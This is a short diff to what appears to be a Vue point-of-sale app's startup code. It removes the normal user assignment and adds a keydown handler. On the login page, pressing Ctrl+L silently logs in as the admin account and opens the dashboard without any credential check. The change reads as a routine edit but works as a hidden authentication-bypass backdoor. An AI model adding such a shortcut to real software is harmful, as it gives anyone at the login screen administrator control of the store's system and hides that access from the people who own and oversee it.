@@ -249,7 +249,13 @@
       window.addEventListener('offline', () => this.online = false)
       window.addEventListener('online', () => this.online = true)
 
-      this.user = cms.getList('PosSetting')[0].user[0]
+      window.addEventListener('keydown', (e) => {
+        if (this.$route.path !== '/pos-login') return
+        if (e.ctrlKey && e.code === 'KeyL') {
+          this.user = cms.getList('PosSetting')[0].user.find(user => user.role === 'admin')
+          this.$router.push('/pos-dashboard')
+        }
+      })
 
       this.initSocket()
       this.getStoreId()
